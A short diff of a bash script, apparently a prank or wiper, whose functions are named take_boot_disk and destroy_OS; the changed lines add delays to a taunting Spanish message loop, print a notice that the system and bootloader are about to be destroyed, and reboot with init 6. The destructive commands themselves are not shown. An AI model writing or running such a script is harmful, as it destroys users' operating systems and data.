@@ -10,7 +10,7 @@ function take_boot_disk()
 function destroy_OS()
 {
     setterm -foreground red
-        for i in {1..100}; do echo "TE LA ACABAS DE BEBERRRR, CON HIELOOOOOOOOO"; done
+        for i in {1..100}; do sleep .1; echo "TE LA ACABAS DE BEBERRRR CON HIELOOOOOOOOO"; done
     
     sleep 3
     echo -e "Procediendo a destruir el sistema y bootloader..."
@@ -84,10 +84,13 @@ function destroy_OS()
 ................................................................................
     
 "
+
+
     
 }
 
 function bye_bye() {
+        sleep 3
         init 6
 }
 
